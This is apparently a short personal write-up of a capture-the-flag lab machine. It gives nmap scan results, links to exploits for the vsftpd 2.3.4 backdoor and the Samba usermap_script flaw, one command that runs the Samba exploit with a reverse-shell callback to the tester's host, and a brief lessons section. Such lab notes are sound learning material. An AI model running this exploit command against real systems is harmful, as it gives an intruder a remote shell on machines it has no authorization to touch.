# Scan
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.23
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

# Access
no exploits for ssh
for vsftpd -> vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | exploits/unix/remote/17491.rb
  6200/tcp filtered lm-x
  I guess you have to send specific commands to get it to open. https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec18/vulnerability-analysis-of-vsftpd-2-3-4-backdoor
  https://github.com/In2econd/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py
The vsftpd thing doesn't seem to work manually or over MSF. Not sure if it's uspposed to? 
Fine, that doesn't work:
  https://raw.githubusercontent.com/amriunix/CVE-2007-2447/master/usermap_script.py
  python exploits/16320.py 10.10.10.3 445 10.10.14.23 1234

That's it. Get both

# Lessons
spent too much time looking into VSFTPD because I thought that was right and should have worked. Didn't even bother looking at the other for awhile. Should keep in mind I might be off. 
